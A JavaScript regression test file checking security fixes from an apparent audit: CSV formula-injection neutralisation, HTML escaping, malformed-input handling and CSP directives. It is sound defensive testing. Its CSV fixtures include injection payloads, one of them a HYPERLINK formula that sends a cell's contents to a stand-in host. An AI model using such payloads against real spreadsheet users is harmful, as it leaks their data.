// Regression tests for defects found by the 2026-10 fuzz/audit run (AUDIT.md). Names start "regression:".
import test from 'node:test';
import assert from 'node:assert/strict';
import { workspaceToImportPayload } from '../app/backup.js';
import * as exportMod from '../app/export.js';
import { chip } from '../app/ui/icons.js';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const read = (rel) => fs.readFileSync(path.join(ROOT, rel), 'utf8');

const { measurementsToCsv } = exportMod;

test('regression: AUD-07 per-run CSV export neutralises formula-leading cells', () => {
  const row = label => measurementsToCsv([{ metricId: 'a', label, value: 1, unit: '', origin: '', confidence: 1 }]).split('\r\n')[1];
  assert.ok(row('=1+1').startsWith("a,'=1+1,"));
  assert.ok(row('-1+1').startsWith("a,'-1+1,"));
  assert.ok(row('+1+1').startsWith("a,'+1+1,"));
  assert.ok(row('@SUM(A1)').startsWith("a,'@SUM(A1),"));
  assert.ok(row('\t=1').startsWith("a,'\t=1,"));
  assert.ok(row('\r=1').startsWith(`a,"'\r=1",`));
  assert.ok(row('=HYPERLINK("https://x.example/?"&B2,"Open")').startsWith(`a,"'=HYPERLINK(""https://x.example/?""&B2,""Open"")",`));
  // Every text column is guarded, not only the label.
  const all = measurementsToCsv([{ metricId: '=a', label: 'ok', value: 1, unit: '+u', origin: '@o', confidence: 1 }]).split('\r\n')[1];
  assert.equal(all, "'=a,ok,1,'+u,'@o,1");
  // Finite numbers stay numeric (negative values are not mangled); numeric-looking strings are guarded.
  const { csvCell } = exportMod;
  assert.equal(typeof csvCell, 'function', 'csvCell is exported as the shared CSV helper');
  assert.equal(csvCell(-3.5), '-3.5');
  assert.equal(csvCell(0), '0');
  assert.equal(csvCell('-3.5'), "'-3.5");
  assert.equal(csvCell(null), '');
  assert.equal(csvCell('plain'), 'plain');
  assert.equal(csvCell(Number.NEGATIVE_INFINITY), "'-Infinity");
  assert.equal(measurementsToCsv([{ metricId: 'a', label: 'L', value: -12.25, unit: 'dB', origin: 'measured', confidence: 1 }]).split('\r\n')[1], 'a,L,-12.25,dB,measured,1');
});

test('regression: AUD-12 chip() escapes its label', () => {
  const html = chip('pass', '<b>x</b> & "q"');
  assert.ok(html.includes('&lt;b&gt;x&lt;/b&gt; &amp; &quot;q&quot;'));
  assert.ok(!html.includes('<b>'));
  assert.ok(chip('pass').includes('<span>PASS</span>'));
});

test('regression: fuzz workspace — non-array measurements/findings are dropped, not a TypeError (AUD-JS-01)', () => {
  const hostile = { version: 1, equipment: [], runs: [
    { id: 'a', measurements: {}, findings: 'x' },
    { id: 'b', measurements: [null, 3, { metricId: 'rms', value: 1, unit: 'dB', qualityFlags: 'bad' }], findings: [{ title: 5, possibleCauses: [1, 'hum'] }] },
  ] };
  const out = workspaceToImportPayload(hostile);
  assert.equal(out.runs.length, 2);
  assert.deepEqual(out.runs[0].measurements, []);
  assert.equal(out.runs[1].measurements.length, 1);
  assert.deepEqual(out.runs[1].measurements[0].qualityFlags, []);
  assert.deepEqual(out.runs[1].findings[0].possibleCauses, ['hum']);
});

test('regression: workspace files over the size cap are refused before parsing (AUD-JS-02)', () => {
  assert.throws(() => exportMod.parseWorkspaceJson('x'.repeat(exportMod.MAX_WORKSPACE_CHARS + 1)), /larger than 64 MB/);
  assert.throws(() => exportMod.parseWorkspaceJson(undefined), /missing/);
});

const directives = (csp) => new Map(csp.split(';').map(s => s.trim()).filter(Boolean).map(d => {
  const [name, ...values] = d.split(/\s+/);
  return [name, values.join(' ')];
}));

test("regression: AUD-11 CSP sets base-uri, form-action, object-src and frame-ancestors to 'none'", () => {
  const csp = directives(JSON.parse(read('src-tauri/tauri.conf.json')).app.security.csp);
  for (const name of ['base-uri', 'form-action', 'object-src', 'frame-ancestors']) {
    assert.equal(csp.get(name), "'none'", name);
  }
  // the existing script policy is unchanged: no inline script, no eval
  assert.equal(csp.get('script-src'), "'self'");
  assert.equal(csp.get('default-src'), "'self'");
});

test('regression: AUD-11 ui-smoke serves the same CSP as tauri.conf.json', () => {
  const conf = JSON.parse(read('src-tauri/tauri.conf.json')).app.security.csp;
  const m = /^const CSP = "([^"]+)";$/m.exec(read('tools/ui-smoke.mjs'));
  assert.ok(m, 'CSP constant found in tools/ui-smoke.mjs');
  assert.equal(m[1], conf);
});
